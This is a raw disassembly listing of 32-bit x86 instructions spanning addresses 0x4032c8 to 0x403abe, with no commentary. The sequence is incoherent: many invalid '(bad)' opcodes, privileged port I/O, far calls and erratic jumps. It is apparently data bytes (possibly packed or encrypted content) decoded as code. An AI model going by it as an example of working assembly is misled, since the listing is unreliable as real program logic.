  4032c8:	rcr    BYTE PTR [esi-0x14fdf82d],1
  4032ce:	rol    DWORD PTR [eax+0x37],0x28
  4032d2:	imul   ebx,DWORD PTR [edx+0x9cf1819],0xffffffb5
  4032d9:	sbb    ebp,DWORD PTR [ebx]
  4032db:	ins    BYTE PTR es:[edi],dx
  4032dc:	push   ebp
  4032dd:	push   0x50
  4032df:	imul   edi,DWORD PTR [eax+esi*4+0x5661d36],0xecbb438
  4032ea:	pop    es
  4032eb:	mov    al,0xbd
  4032ed:	bound  ebx,QWORD PTR [esi]
  4032ef:	xchg   esi,eax
  4032f0:	push   eax
  4032f1:	cmc    
  4032f2:	sbb    al,0x2c
  4032f4:	ins    BYTE PTR es:[edi],dx
  4032f5:	xor    eax,0x8453f23d
  4032fa:	or     BYTE PTR [edi-0x6],ch
  4032fd:	jg     0x403308
  4032ff:	bound  ebp,QWORD PTR [esi-0x3cfdf32c]
  403305:	mov    dl,0xa9
  403307:	and    BYTE PTR [eax+0x10887b18],dh
  40330d:	mov    esi,0x2bec98e
  403312:	in     al,dx
  403313:	add    al,0x2f
  403315:	mov    al,ds:0x2e17fbf3
  40331a:	ss jg  0x4032a3
  40331d:	push   ds
  40331e:	lea    eax,[ecx+ebp*1]
  403321:	fwait
  403322:	(bad)  
  403323:	imul   DWORD PTR [esi+0x31fdb169]
  403329:	bound  dx,DWORD PTR [ecx]
  40332c:	mov    DWORD PTR [edi-0x36],ecx
  40332f:	dec    edx
  403330:	xlat   BYTE PTR ds:[ebx]
  403331:	jge    0x403335
  403333:	jbe    0x4032c1
  403335:	pop    edi
  403336:	or     ebx,ebx
  403338:	adc    al,0x5b
  40333a:	imul   ecx
  40333c:	sbb    ch,BYTE PTR [edx+0x1191b1df]
  403342:	pop    eax
  403343:	push   esp
  403344:	scas   al,BYTE PTR es:[edi]
  403345:	imul   edx,esp,0x3a8efdf8
  40334b:	(bad)  [edx+0x53b3cdd1]
  403351:	xlat   BYTE PTR ds:[ebx]
  403352:	cmc    
  403353:	prefetch BYTE PTR [edi-0x68a920f9]
  40335a:	mov    eax,0x3bd417b7
  40335f:	mov    esi,0x613b7333
  403364:	std    
  403365:	mov    edi,gs
  403367:	jmp    0x40337c
  403369:	jne    0x403303
  40336b:	retf   
  40336c:	clc    
  40336d:	and    DWORD PTR [eax-0x6b],esp
  403370:	mov    ecx,0x19d32943
  403375:	gs cmc 
  403377:	lods   eax,DWORD PTR ds:[esi]
  403378:	mov    bl,0x5f
  40337a:	scas   al,BYTE PTR es:[edi]
  40337b:	shl    BYTE PTR [edx],0x7d
  40337e:	(bad)  
  40337f:	jbe    0x4033e2
  403381:	cmp    ebx,ebx
  403383:	stos   DWORD PTR es:[edi],eax
  403384:	cmc    
  403385:	push   ss
  403386:	cmp    eax,0x19dcd7dc
  40338b:	(bad)  [edx+0x3]
  40338e:	shl    BYTE PTR [ebx],0xb4
  403391:	sub    ah,BYTE PTR [ebx]
  403393:	pop    ax
  403395:	jg     0x4033b8
  403397:	rcr    DWORD PTR [esi+0x9bb52f],0x5
  40339e:	out    0xa1,al
  4033a0:	or     eax,0x1789bce6
  4033a5:	data16 fcmovnb st,st(2)
  4033a8:	jbe    0x40336f
  4033aa:	and    DWORD PTR [ebx+0x6d684966],edx
  4033b0:	std    
  4033b1:	or     ah,dh
  4033b3:	stc    
  4033b4:	mov    ds:0x3bf54a1f,al
  4033b9:	dec    esp
  4033ba:	retf   0x7684
  4033bd:	sub    edx,DWORD PTR [ecx+0x55f3bc56]
  4033c3:	jle    0x403443
  4033c5:	shl    dl,1
  4033c7:	sub    al,0x82
  4033c9:	call   0x2eb8b4eb
  4033ce:	out    dx,al
  4033cf:	push   ss
  4033d0:	shr    BYTE PTR [edx-0x24cae85],0x15
  4033d7:	loopne 0x40336e
  4033d9:	dec    esi
  4033da:	adc    al,0x79
  4033dc:	push   edi
  4033dd:	pop    esp
  4033de:	movsx  esp,BYTE PTR [edx+eax*8-0x5ec2c3d6]
  4033e6:	jbe    0x40343e
  4033e8:	mov    DWORD PTR [edi-0xd0d5c60],esp
  4033ee:	sub    BYTE PTR [ebx+0xeffe46a],cl
  4033f4:	test   eax,0x74be6b33
  4033f9:	cmp    ah,BYTE PTR [ebx+0x2bb56f55]
  4033ff:	add    bl,BYTE PTR [esi-0xe01103a]
  403405:	aas    
  403406:	xor    al,0x67
  403408:	lea    eax,[edi-0x6b]
  40340b:	lods   eax,DWORD PTR ds:[esi]
  40340c:	stos   BYTE PTR es:[edi],al
  40340d:	adc    eax,0x40f3a7aa
  403412:	cmp    eax,0x138b6180
  403417:	lahf   
  403418:	cld    
  403419:	dec    ecx
  40341a:	(bad)  
  40341b:	aad    0x79
  40341d:	xchg   DWORD PTR [ebp+0x10],ecx
  403420:	xor    BYTE PTR ds:0xad5c9009,dl
  403426:	test   DWORD PTR [ebx],edx
  403428:	cmp    DWORD PTR [ebx+0x564db836],eax
  40342e:	call   0x91ca:0xaad0e349
  403435:	out    0x30,eax
  403437:	mov    bl,0x3c
  403439:	jge    0x403443
  40343b:	add    DWORD PTR [ebx-0x3d],ebx
  40343e:	pop    ebp
  40343f:	stc    
  403440:	jl     0x403471
  403442:	push   cs
  403443:	add    DWORD PTR [ebx],esp
  403445:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403447:	mov    edx,0x2c2bf30d
  40344c:	mov    ch,0xca
  40344e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40344f:	jle    0x40340b
  403451:	cdq    
  403452:	and    dl,al
  403454:	cmp    al,0x1c
  403456:	aaa    
  403457:	mov    ds:0x4e158072,al
  40345c:	push   0xe483e9a5
  403461:	fisubr DWORD PTR [eax-0x26782da0]
  403467:	adc    DWORD PTR [edi-0x301025cc],0xd2b2110b
  403471:	mov    dh,0x7b
  403473:	shl    DWORD PTR [ebx-0x5a4ca223],1
  403479:	std    
  40347a:	pop    ss
  40347b:	add    BYTE PTR [edi+0x277d5002],bh
  403481:	pop    esp
  403482:	imul   ecx,DWORD PTR [ebp+0x2f7a6b4a],0xffffffa6
  403489:	das    
  40348a:	mov    esp,0x3bbb057
  40348f:	pop    ebp
  403490:	xor    ebp,DWORD PTR [ebp+0x2e]
  403493:	push   esi
  403494:	push   ds
  403495:	cmp    BYTE PTR [ecx],dh
  403497:	sub    al,0x35
  403499:	lss    ebp,FWORD PTR [ebp+ebp*4-0x7d9f0236]
  4034a1:	jmp    DWORD PTR [eax]
  4034a3:	jae    0x4034bc
  4034a5:	repz push ecx
  4034a7:	lods   al,BYTE PTR ds:[esi]
  4034a8:	sti    
  4034a9:	ins    BYTE PTR es:[edi],dx
  4034aa:	fimul  DWORD PTR [ebp+0x65]
  4034ad:	jmp    DWORD PTR [esp+ecx*4-0x77b4e81a]
  4034b4:	mov    cl,0x74
  4034b6:	adc    bh,BYTE PTR [ecx-0x69]
  4034b9:	dec    esi
  4034ba:	fs nop
  4034bc:	mov    dl,0x5e
  4034be:	scas   eax,DWORD PTR es:[edi]
  4034bf:	(bad)  
  4034c0:	daa    
  4034c1:	pop    ecx
  4034c2:	out    0xf6,al
  4034c4:	popa   
  4034c5:	(bad)
  4034c8:	sub    edx,DWORD PTR [edx-0x56842a25]
  4034ce:	push   esi
  4034cf:	pop    es
  4034d0:	int    0x86
  4034d2:	adc    eax,DWORD PTR [edi-0x4b]
  4034d5:	mov    bh,0xf7
  4034d7:	xor    al,0xee
  4034d9:	cdq    
  4034da:	sbb    BYTE PTR [ecx-0x4a308ab0],al
  4034e0:	test   DWORD PTR [ecx+0x308ebb55],ebp
  4034e6:	icebp  
  4034e7:	aad    0x71
  4034e9:	fwait
  4034ea:	mov    cl,0x75
  4034ec:	jae    0x40353f
  4034ee:	fistp  WORD PTR [edi]
  4034f0:	loopne 0x4034de
  4034f2:	xor    ebx,edi
  4034f4:	cdq    
  4034f5:	mov    ch,BYTE PTR [edx+0x78]
  4034f8:	clc    
  4034f9:	jne    0x40350c
  4034fb:	jp     0x403525
  4034fd:	je     0x4034b1
  4034ff:	test   eax,0xb44cfac
  403504:	(bad)  
  403505:	or     bl,dl
  403507:	outs   dx,BYTE PTR ds:[esi]
  403508:	pop    eax
  403509:	cli    
  40350a:	ss inc edx
  40350c:	bound  edi,QWORD PTR [esp+edi*4]
  40350f:	jecxz  0x40352c
  403511:	xchg   DWORD PTR [edi+0x36],edi
  403514:	jmp    0x4034e9
  403516:	inc    edi
  403517:	push   eax
  403518:	call   0xa4eb:0x5051e7da
  40351f:	test   BYTE PTR [ebp+0x3143a251],dh
  403525:	mov    WORD PTR [edx-0x3f],ds
  403528:	(bad)  
  40352a:	mov    dh,0x47
  40352c:	mov    esi,0x7c4da2fd
  403531:	add    eax,0xc6230b1e
  403536:	pop    ss
  403537:	mov    eax,ds:0xe1c1ac
  40353c:	mov    cl,0xd
  40353e:	daa    
  40353f:	sub    eax,0xe81f1acf
  403544:	stc    
  403545:	mov    dl,0xb5
  403547:	xor    eax,0x54c0fdb4
  40354c:	mov    ds,WORD PTR [esi+0x13ca9320]
  403552:	inc    edx
  403553:	pop    ss
  403554:	mov    ch,0x65
  403556:	dec    eax
  403557:	push   ecx
  403558:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403559:	xchg   edx,eax
  40355a:	fisub  DWORD PTR [edx+0x23ca4a5a]
  403560:	jne    0x40353d
  403562:	lahf   
  403563:	push   ecx
  403564:	adc    DWORD PTR [ecx+0x32b71d7a],esi
  40356a:	and    DWORD PTR [esi],edi
  40356c:	sub    eax,0x3d0c3067
  403571:	or     eax,0xcfad5449
  403576:	add    ebp,eax
  403578:	retf   
  403579:	js     0x403565
  40357b:	(bad)  
  40357d:	lods   eax,DWORD PTR ds:[esi]
  40357e:	mov    edi,0x95d80e79
  403583:	or     al,0x5f
  403585:	stc    
  403586:	test   dl,dl
  403588:	push   eax
  403589:	aaa    
  40358a:	scas   al,BYTE PTR es:[edi]
  40358b:	add    eax,0xeb995e89
  403590:	dec    edx
  403591:	sbb    eax,DWORD PTR [eax+ecx*1+0x4c]
  403595:	fwait
  403596:	ja     0x403563
  403598:	nop
  403599:	push   ebp
  40359a:	mov    BYTE PTR ds:0xad10a7a1,dl
  4035a0:	or     DWORD PTR [edx+0x45],esp
  4035a3:	and    BYTE PTR [edi+eiz*1+0x47],ch
  4035a7:	stos   DWORD PTR es:[edi],eax
  4035a8:	int3   
  4035a9:	repnz imul DWORD PTR [ebp-0x64d2650a]
  4035b0:	pop    edx
  4035b1:	shl    ebp,1
  4035b3:	pop    ebp
  4035b4:	adc    cl,dl
  4035b6:	ins    BYTE PTR es:[edi],dx
  4035b7:	frstor [ebx-0x7b]
  4035ba:	or     esi,DWORD PTR [esi+0x73757967]
  4035c0:	jge    0x40355b
  4035c2:	fincstp 
  4035c4:	in     eax,0x24
  4035c6:	ficomp WORD PTR [eax]
  4035c8:	push   edx
  4035c9:	divps  xmm4,xmm1
  4035cc:	test   BYTE PTR [esi+0x33],dl
  4035cf:	imul   ebx,edi,0xa7aca8ab
  4035d5:	cdq    
  4035d6:	enter  0xb385,0x3f
  4035da:	rcl    BYTE PTR [ebx],0x7b
  4035dd:	fwait
  4035de:	pop    ds
  4035df:	js     0x4035a2
  4035e1:	(bad)  
  4035e2:	sar    DWORD PTR [edi+0x6c],1
  4035e5:	cwde   
  4035e6:	sbb    ebx,DWORD PTR [edx-0x27]
  4035e9:	xchg   DWORD PTR [edi+eax*4],esp
  4035ec:	int3   
  4035ed:	test   BYTE PTR [edx+ebp*4],dh
  4035f0:	jg     0x4035b2
  4035f2:	ds xlat BYTE PTR ds:[ebx]
  4035f5:	mov    dl,0x17
  4035f7:	retf   0x984a
  4035fa:	add    DWORD PTR [eax+0x12eb8474],0x50
  403601:	retf   0xd3ed
  403604:	das    
  403605:	adc    eax,0x91165c3a
  40360b:	xchg   esp,eax
  40360c:	mov    edx,0x3325edab
  403611:	not    DWORD PTR [eax]
  403613:	sbb    al,0x7c
  403615:	adc    cl,BYTE PTR [esi-0x46]
  403618:	mov    esp,ecx
  40361a:	xchg   ecx,eax
  40361b:	pop    eax
  40361c:	mov    dh,0xb7
  40361e:	xor    esi,DWORD PTR [ebp+0x485c79c4]
  403624:	mov    ch,0x7c
  403626:	out    dx,al
  403627:	xor    BYTE PTR [esi+0x2dcacd5f],dh
  40362d:	jne    0x403606
  40362f:	enter  0x4b3,0xd5
  403633:	lock daa 
  403635:	push   cs
  403636:	or     eax,0x6394de3e
  40363b:	sbb    al,0xf3
  40363d:	jae    0x40364e
  40363f:	jb     0x40369e
  403641:	xlat   BYTE PTR ds:[ebx]
  403642:	mov    dl,0x8a
  403644:	inc    edi
  403645:	jnp    0x4035ef
  403647:	inc    edx
  403648:	stos   DWORD PTR es:[edi],eax
  403649:	data16 bnd jne 0x403685
  40364d:	push   ebp
  40364e:	sub    BYTE PTR [edx],cl
  403650:	stc    
  403651:	push   ss
  403652:	sub    bl,BYTE PTR [ebx+0x21]
  403655:	mov    ecx,0x2ea84aaf
  40365a:	cdq    
  40365b:	in     eax,0x80
  40365d:	test   DWORD PTR [edi-0x4b],ebx
  403660:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403661:	jbe    0x403656
  403663:	aaa    
  403664:	push   edx
  403665:	xor    al,0x3a
  403667:	and    bl,BYTE PTR [esi]
  403669:	out    0x60,al
  40366b:	test   al,0xe1
  40366d:	xor    ch,BYTE PTR [eax]
  40366f:	adc    BYTE PTR ds:0xa42e3809,0xda
  403676:	inc    ebx
  403677:	pusha  
  403678:	pop    eax
  403679:	and    ecx,ebx
  40367b:	loopne 0x403650
  40367d:	jae    0x403644
  40367f:	xchg   ecx,eax
  403680:	mov    edi,0xace21bcc
  403685:	ins    DWORD PTR es:[edi],dx
  403686:	add    al,0x3b
  403688:	jge    0x4036d5
  40368a:	push   cs
  40368b:	and    BYTE PTR [esi],al
  40368d:	inc    ebx
  40368e:	inc    ebx
  40368f:	repnz dec esi
  403691:	fwait
  403692:	jnp    0x403618
  403694:	out    0xe8,al
  403696:	and    eax,DWORD PTR [ebp-0x6a6522ac]
  40369c:	add    bl,BYTE PTR [ecx-0xb]
  40369f:	enter  0xe16,0x5a
  4036a3:	sbb    esi,DWORD PTR [edi+0x5e69618c]
  4036a9:	shl    DWORD PTR [ecx+0x44],1
  4036ac:	stc    
  4036ad:	push   ss
  4036ae:	xor    eax,0x8bdb9fa
  4036b3:	ror    BYTE PTR [esi+0x28],cl
  4036b6:	call   0x1d49f1cb
  4036bb:	dec    ebx
  4036bc:	xchg   esp,eax
  4036bd:	xchg   BYTE PTR [ebx-0x63281a8d],bh
  4036c3:	pushf  
  4036c4:	ja     0x4036ee
  4036c6:	jbe    0x4036be
  4036c8:	add    eax,0xc29b50ba
  4036cd:	dec    ecx
  4036ce:	fcomp  QWORD PTR ds:0x8e8dd68e
  4036d4:	loopne 0x403738
  4036d6:	xchg   edx,eax
  4036d7:	xchg   esi,eax
  4036d8:	mov    ebp,0x1f3ca66f
  4036dd:	lahf   
  4036de:	adc    BYTE PTR [eax+0x1],cl
  4036e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4036e2:	and    edx,edx
  4036e4:	mov    ebp,0xa6ec87fe
  4036e9:	inc    edx
  4036ea:	in     al,dx
  4036eb:	dec    edx
  4036ec:	(bad)  
  4036ed:	mov    al,BYTE PTR [esi+eax*2-0x62]
  4036f1:	js     0x4036d5
  4036f3:	mov    ch,0xbe
  4036f5:	fistp  QWORD PTR [esi+0x2a]
  4036f8:	adc    ah,BYTE PTR [edi+0x7c76dbd6]
  4036fe:	sbb    ch,BYTE PTR [ebp-0xe282766]
  403704:	xchg   DWORD PTR [esi-0x2f],esp
  403707:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403708:	jmp    0x4a2ae55
  40370d:	mov    ecx,0xda5fbc8f
  403712:	xchg   ebp,eax
  403713:	push   ds
  403714:	xor    BYTE PTR [edx],ch
  403716:	outs   dx,BYTE PTR ds:[esi]
  403717:	mov    ecx,0x2832922e
  40371c:	mov    ebp,0x2fe905a1
  403721:	jnp    0x40372e
  403723:	push   ds
  403724:	cmp    al,0xa4
  403726:	adc    cl,ah
  403728:	push   es
  403729:	cli    
  40372a:	lahf   
  40372b:	ss es scas eax,DWORD PTR es:[edi]
  40372e:	dec    eax
  40372f:	mov    edi,0x34d63cf3
  403734:	and    eax,0x180c9a8b
  403739:	dec    ecx
  40373a:	dec    ebx
  40373b:	sbb    eax,DWORD PTR [edx]
  40373d:	fisub  DWORD PTR [edx-0x7]
  403740:	fistp  QWORD PTR [edi+edi*1+0x2785668b]
  403747:	jno    0x403734
  403749:	and    eax,0x2d6873db
  40374e:	sub    eax,0x68969a1b
  403753:	add    eax,0x346af58d
  403758:	fist   DWORD PTR [ecx-0x6a6742db]
  40375e:	or     eax,0x46a9a05d
  403763:	mov    edx,0x965b0537
  403768:	inc    esp
  403769:	rcl    BYTE PTR [ecx-0x64],0x3f
  40376d:	xchg   ebp,eax
  40376e:	shr    BYTE PTR [eax],1
  403770:	out    0x31,al
  403772:	into   
  403773:	loop   0x403723
  403775:	jne    0x403726
  403777:	xchg   ebp,eax
  403778:	mov    dh,0xc5
  40377a:	jbe    0x403772
  40377c:	addr16 jmp 0x4037aa
  40377f:	inc    edi
  403780:	xor    BYTE PTR [ebx-0x6d543c85],al
  403786:	out    dx,al
  403787:	fisubr DWORD PTR [ebx]
  403789:	mov    ebx,0x8665344d
  40378e:	imul   esp,DWORD PTR [ebp-0x6d82ba1e],0xffffff83
  403795:	(bad)  
  403796:	cmp    ah,BYTE PTR [eax+0x5d7a9877]
  40379c:	icebp  
  40379d:	xchg   edi,eax
  40379e:	xchg   esi,eax
  40379f:	retf   0x17ac
  4037a2:	and    ebx,DWORD PTR [ecx]
  4037a4:	es cld 
  4037a6:	sti    
  4037a7:	mov    edi,0xbb3b0ed6
  4037ac:	pop    es
  4037ad:	mov    eax,ds:0x8d143fb3
  4037b2:	cmc    
  4037b3:	push   0x4c
  4037b5:	ja     0x40377a
  4037b7:	mov    esi,gs
  4037b9:	inc    esi
  4037ba:	je     0x4037e2
  4037bc:	adc    bl,cl
  4037be:	jns    0x4037ae
  4037c0:	scas   al,BYTE PTR es:[edi]
  4037c1:	(bad)  [edi-0x78142555]
  4037c7:	xor    DWORD PTR [edx+0x56],ebp
  4037ca:	adc    cl,al
  4037cc:	iret   
  4037cd:	add    dh,BYTE PTR [ebp+0x1e]
  4037d0:	ds push ebp
  4037d2:	test   BYTE PTR [ebp-0x23448ee4],dh
  4037d8:	loope  0x4037e8
  4037da:	int3   
  4037db:	inc    ecx
  4037dc:	push   ebx
  4037dd:	or     esi,DWORD PTR [edx+0x25a2fc8d]
  4037e3:	mov    dl,bh
  4037e5:	pop    ebp
  4037e6:	adc    BYTE PTR [ebx+0x36],al
  4037e9:	pop    esp
  4037ea:	wbinvd 
  4037ec:	mov    ds:0x735a0926,eax
  4037f1:	inc    ebx
  4037f2:	(bad)  
  4037f3:	cmc    
  4037f4:	(bad)  
  4037f5:	xchg   esi,eax
  4037f6:	sbb    eax,0x9c4ec961
  4037fb:	out    dx,eax
  4037fc:	add    DWORD PTR [ecx+0x6597fd63],esp
  403802:	aad    0x70
  403804:	or     ebx,DWORD PTR [eax*1-0x13fdfa9]
  40380b:	jno    0x403859
  40380d:	mov    edx,0x973901bf
  403812:	shl    DWORD PTR [edi+0xd],0xa5
  403816:	mov    WORD PTR [edx],ds
  403818:	(bad)  
  403819:	adc    al,0x5
  40381b:	pop    ss
  40381c:	loope  0x40388e
  40381e:	or     BYTE PTR [edi],cl
  403820:	stos   BYTE PTR es:[edi],al
  403821:	repz aaa 
  403823:	sub    eax,0xa71e8458
  403828:	sbb    dh,ch
  40382a:	scas   eax,DWORD PTR es:[edi]
  40382b:	dec    eax
  40382c:	or     eax,0x8ce12190
  403831:	lods   eax,DWORD PTR ds:[esi]
  403832:	mov    bl,0x4e
  403834:	std    
  403835:	ficomp WORD PTR [ecx-0xc717dd9]
  40383b:	or     cl,bl
  40383d:	mov    ch,0x8c
  40383f:	add    BYTE PTR [esi-0x6add18de],ch
  403845:	pusha  
  403846:	fisub  DWORD PTR [edi-0x46]
  403849:	pop    esp
  40384a:	stos   BYTE PTR es:[edi],al
  40384b:	es das 
  40384d:	mov    bl,BYTE PTR [eax+eax*1+0x31]
  403851:	(bad)  
  403852:	ret    0xbc57
  403855:	mov    ch,0xac
  403857:	scas   eax,DWORD PTR es:[edi]
  403858:	or     ch,BYTE PTR [edi+0x5e]
  40385b:	jae    0x4038ab
  40385d:	clc    
  40385e:	sbb    ebp,DWORD PTR [esi]
  403860:	mov    eax,ds:0x388be97d
  403865:	outs   dx,BYTE PTR ds:[esi]
  403866:	dec    esp
  403867:	out    dx,eax
  403868:	out    0xe5,al
  40386a:	shl    dl,cl
  40386c:	mov    ecx,0x96352d5d
  403871:	(bad)  
  403872:	or     eax,0x24c1f0b
  403877:	add    eax,0x83dfd8b3
  40387c:	add    DWORD PTR [ecx],edi
  40387e:	pop    ss
  40387f:	mov    dh,0x41
  403881:	xor    DWORD PTR [eax+0x74],edx
  403884:	pop    ds
  403885:	bound  edx,QWORD PTR [ebx-0x59]
  403888:	test   BYTE PTR [edi-0x4a],dh
  40388b:	cmp    DWORD PTR [esi+edi*2-0x56d4a1ce],ecx
  403892:	adc    DWORD PTR [edx-0x4],ecx
  403895:	shl    esi,0x82
  403898:	sbb    DWORD PTR [ecx-0x45],edi
  40389b:	lock xchg ecx,eax
  40389d:	mov    WORD PTR [eax+0xe],gs
  4038a0:	cld    
  4038a1:	sub    eax,0xd291af55
  4038a6:	jmp    0xc8847c92
  4038ab:	hlt    
  4038ac:	add    BYTE PTR [edi-0x668c9d34],dh
  4038b2:	data16 out 0x68,al
  4038b5:	out    dx,eax
  4038b6:	jmp    0xe677b394
  4038bb:	(bad)  
  4038bd:	sahf   
  4038be:	add    esp,DWORD PTR [ebp-0xa38ef02]
  4038c4:	lock fwait
  4038c6:	and    ch,bl
  4038c8:	stos   DWORD PTR es:[edi],eax
  4038c9:	push   0xad5399e0
  4038ce:	mov    ch,BYTE PTR [ebx]
  4038d0:	pop    ss
  4038d1:	out    dx,eax
  4038d2:	dec    eax
  4038d3:	jp     0x403857
  4038d5:	arpl   WORD PTR [ebx+ecx*2+0x4d1cc27a],cx
  4038dc:	inc    ebx
  4038dd:	mov    ch,0xa0
  4038df:	mov    eax,0xfd08f49
  4038e4:	push   cs
  4038e5:	cmc    
  4038e6:	(bad)  
  4038e7:	aaa    
  4038e8:	loopne 0x403948
  4038ea:	adc    eax,esi
  4038ec:	pop    edi
  4038ed:	out    0x41,eax
  4038ef:	jb     0x403940
  4038f1:	mov    ebp,0x9343c779
  4038f6:	leave  
  4038f7:	outs   dx,DWORD PTR ds:[esi]
  4038f8:	push   edx
  4038f9:	popa   
  4038fa:	popa   
  4038fb:	add    al,0x20
  4038fd:	aas    
  4038fe:	into   
  4038ff:	lods   eax,DWORD PTR ds:[esi]
  403900:	fdivr  DWORD PTR [edi+0xb]
  403903:	xchg   ebx,eax
  403904:	or     al,0xf1
  403906:	call   0x2e22:0xb7f0509a
  40390d:	ror    BYTE PTR ds:0xf13d3bb2,1
  403913:	pop    ecx
  403914:	inc    ebx
  403915:	cld    
  403916:	add    al,0xdb
  403918:	adc    ah,ah
  40391a:	popa   
  40391b:	jnp    0x40391e
  40391d:	xor    eax,0xb4f67e01
  403922:	mov    ds:0x42062a4,eax
  403927:	cmovae esp,ebp
  40392a:	sbb    al,0xfe
  40392c:	daa    
  40392d:	test   DWORD PTR [ecx-0x4f027a24],0xa049ce78
  403937:	lock mov fs,WORD PTR es:[ecx+0x2f]
  40393c:	inc    edx
  40393d:	sub    eax,0xa7cea0b8
  403942:	cmp    al,0x37
  403944:	pop    edi
  403945:	and    DWORD PTR [ebx+0x4a],ebx
  403948:	jne    0x4039a2
  40394a:	js     0x403917
  40394c:	jo     0x40392b
  40394e:	ror    BYTE PTR [edx+0x7b5dc90e],1
  403954:	std    
  403955:	inc    ebx
  403956:	call   0xe21cfc82
  40395b:	(bad)  
  40395c:	in     al,dx
  40395d:	test   BYTE PTR [ebp-0x1d8fae00],dh
  403963:	ret    0x54c5
  403966:	outs   dx,BYTE PTR ds:[esi]
  403967:	or     al,0x6e
  403969:	jmp    0x6c18116f
  40396e:	loop   0x403930
  403970:	les    esp,FWORD PTR [ebp+0x68]
  403973:	clc    
  403974:	sti    
  403975:	stc    
  403976:	jge    0x403998
  403978:	ror    dh,0x0
  40397b:	xor    ebx,ebx
  40397d:	xchg   esi,eax
  40397e:	jg     0x403973
  403980:	pop    ss
  403981:	mov    ebp,0xb3d3205
  403986:	pop    ecx
  403987:	dec    ebp
  403988:	and    BYTE PTR [ecx],0xb7
  40398b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40398c:	xor    edx,DWORD PTR [esi+0x2a20ac21]
  403992:	popf   
  403993:	push   ebp
  403994:	sub    bl,BYTE PTR [edi]
  403996:	ja     0x4039fa
  403998:	mov    eax,0x6c32686a
  40399d:	xor    BYTE PTR [ecx*2+0x366ace31],0x8d
  4039a5:	ret    
  4039a6:	lods   eax,DWORD PTR ds:[esi]
  4039a7:	dec    esi
  4039a8:	push   ds
  4039a9:	sub    BYTE PTR [ebx],bl
  4039ab:	dec    edi
  4039ac:	adc    BYTE PTR [eax+ebp*8-0x58d27d5b],cl
  4039b3:	call   0x3a3b9acc
  4039b8:	mov    edi,ss
  4039ba:	mov    WORD PTR [ebx-0x5797e01],es
  4039c0:	daa    
  4039c1:	cmp    eax,0x634c9ec
  4039c6:	fcmovnb st,st(6)
  4039c8:	mov    al,0xa6
  4039ca:	hlt    
  4039cb:	loopne 0x403a2c
  4039cd:	jo     0x403a1b
  4039cf:	mov    BYTE PTR [esi-0x5c56c812],al
  4039d5:	ja     0x4039e9
  4039d7:	and    ebx,DWORD PTR [edi+0x3c5b10f5]
  4039dd:	push   eax
  4039de:	int3   
  4039df:	jg     0x4039c8
  4039e1:	hlt    
  4039e2:	push   eax
  4039e3:	jo     0x4039d2
  4039e5:	shl    BYTE PTR [edi],1
  4039e7:	call   0xeeeeea68
  4039ec:	daa    
  4039ed:	mov    dh,0x6
  4039ef:	jmp    0x5082:0xeab8bdaf
  4039f6:	pop    ecx
  4039f7:	into   
  4039f8:	inc    ebx
  4039f9:	(bad)  
  4039fa:	hlt    
  4039fb:	cmp    eax,0xb2808b68
  403a00:	ror    BYTE PTR [edi-0x3e34e4e4],1
  403a06:	push   ss
  403a07:	pop    edi
  403a08:	dec    esp
  403a09:	pop    ebx
  403a0a:	sub    DWORD PTR [esi-0x22082c5b],esi
  403a10:	enter  0x8ec4,0x98
  403a14:	push   ecx
  403a15:	sbb    DWORD PTR [eax],esp
  403a17:	add    dh,ch
  403a19:	int3   
  403a1a:	fst    DWORD PTR [eax]
  403a1c:	add    al,0x15
  403a1e:	(bad)  
  403a1f:	lods   eax,DWORD PTR ds:[esi]
  403a20:	not    edi
  403a22:	cmp    edx,DWORD PTR [ecx]
  403a24:	std    
  403a25:	ds inc ecx
  403a27:	hlt    
  403a28:	inc    ecx
  403a29:	pop    edi
  403a2a:	or     al,0xfa
  403a2c:	out    0x55,al
  403a2e:	cmc    
  403a2f:	mov    dl,0x3e
  403a31:	and    bh,BYTE PTR [edi-0x24]
  403a34:	push   cs
  403a35:	dec    ecx
  403a36:	lock test al,0x90
  403a39:	add    BYTE PTR [edi],ah
  403a3b:	mov    cl,0xc1
  403a3d:	jp     0x403a63
  403a3f:	outs   dx,BYTE PTR ds:[esi]
  403a40:	int    0xe
  403a42:	adc    eax,0x3013ac6d
  403a47:	ficom  DWORD PTR [ebx-0x78]
  403a4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403a4b:	mov    ds:0x6d13525,al
  403a50:	adc    cl,BYTE PTR [ebx+0x338f6ca0]
  403a56:	cdq    
  403a57:	sbb    BYTE PTR [edi-0x3c2b83fc],ah
  403a5d:	jmp    0x403a8b
  403a5f:	jnp    0x403a97
  403a61:	mov    ds:0xfdb3da82,eax
  403a66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403a67:	sti    
  403a68:	inc    esp
  403a69:	xchg   ebp,eax
  403a6a:	mov    ah,0x94
  403a6c:	ret    
  403a6d:	loopne 0x403a95
  403a6f:	sub    DWORD PTR [ebx+ebp*1],esi
  403a72:	sub    DWORD PTR [eax+0x47f0312a],ebp
  403a78:	ret    
  403a79:	(bad)  
  403a7b:	lahf   
  403a7c:	xor    eax,DWORD PTR [edi-0x65]
  403a7f:	retf   
  403a80:	xchg   esp,ecx
  403a82:	jnp    0x403a77
  403a84:	cli    
  403a85:	sub    al,0x7a
  403a87:	gs scas eax,DWORD PTR es:[edi]
  403a89:	jle    0x403a2d
  403a8b:	inc    esi
  403a8c:	adc    DWORD PTR [esi],ebp
  403a8e:	retf   
  403a8f:	out    dx,al
  403a90:	xchg   ch,al
  403a92:	stos   BYTE PTR es:[edi],al
  403a93:	(bad)  
  403a94:	mov    ecx,0x44d2db8c
  403a99:	adc    BYTE PTR [ebx-0xe],ah
  403a9c:	loop   0x403a7b
  403a9e:	add    eax,0x67085d08
  403aa3:	stos   BYTE PTR es:[edi],al
  403aa4:	ja     0x403afb
  403aa6:	fdivr  DWORD PTR [eax]
  403aa8:	ret    
  403aa9:	push   edx
  403aaa:	cmp    DWORD PTR [esi-0x270675b0],eax
  403ab0:	std    
  403ab1:	sbb    DWORD PTR [ecx-0x6eefdf6],0x70182b82
  403abb:	lods   eax,DWORD PTR ds:[esi]
  403abc:	loope  0x403ad1
  403abe:	cli    
